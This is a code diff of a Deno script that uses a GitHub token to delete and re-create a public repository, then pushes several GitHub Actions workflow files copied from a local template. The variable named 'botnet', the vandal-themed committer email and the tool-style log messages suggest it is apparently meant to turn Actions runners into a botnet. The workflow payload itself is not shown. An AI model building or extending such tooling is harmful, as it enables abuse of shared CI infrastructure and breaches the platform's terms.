@@ -1,37 +1,66 @@
 import { Octokit, App } from "https://esm.sh/octokit?dts";
 import "https://deno.land/x/dotenv@v3.2.0/load.ts";
 
-const { TOKEN, REPO_URL } = Deno.env.toObject();
+const { TOKEN } = Deno.env.toObject();
 
 const octokit = new Octokit({
   auth: TOKEN,
 });
+const myName = await octokit.rest.users.getAuthenticated();
+const myOwner = myName.data.login;
 
-const owner = REPO_URL.split("/").shift() ?? "";
-const repo = REPO_URL.split("/").pop() ?? "";
+// already exist
+if ((await octokit.rest.repos.get({
+  owner: myOwner,
+  repo: "test",
+})).status === 200) {
+  console.log("[!] Already forked");
+  await octokit.rest.repos.delete({
+    owner: myOwner,
+    repo: "test",
+  })
+  console.log("[!] Delete and re-fork");
+}
 
-const botnet = await octokit.rest.repos.createFork({
-  owner,
-  repo,
+
+const botnet = await octokit.rest.repos.createForAuthenticatedUser({
+  name: "test",
+  private: false,
+  description: "for education",
 });
 
-console.log("[!] Forked");
+console.log("[!] Created");
 
-const forkOwner = botnet.data.owner.login;
-const forkRepo = botnet.data.name;
+const afterOwner = botnet.data.owner.login;
+const afterRepo = botnet.data.name;
 
-const { data } = await octokit.rest.repos.createOrUpdateFileContents({
-  owner: forkOwner,
-  repo: forkRepo,
-  path: ".github/workflows/entry.yml",
-  message: "setup",
-  content: btoa("Hello World"),
-  committer: {
-    name: `SetupBot`,
-    email: "amex@荒らし.com",
-  },
-  author: {
-    name: "SetupBot",
-    email: "amex@荒らし.com",
-  },
-});
+const array = Array.from({ length: 2 }).fill(0).map(async (_v, i) => {
+    console.log("[!] Create reg-" + i);
+    const workflow = await octokit.rest.repos.createOrUpdateFileContents({
+        owner: afterOwner,
+        repo: afterRepo,
+        path: ".github/workflows/entry" + i + ".yml",
+        message: "setup",
+        content: btoa(await Deno.readTextFile("./objects/index.yml")),
+        committer: {
+          name: `SetupBot`,
+          email: "amex@荒らし.com",
+        },
+        author: {
+          name: "SetupBot",
+          email: "amex@荒らし.com",
+        },
+    });
+
+    return workflow.data.content?.path
+})
+
+console.log("[!] Writed Action");
+
+console.log("[!] Start setup");
+
+// run workflow
+
+array.forEach(async (_v, i) => {
+    console.log("[!] Run " + await _v);
+})
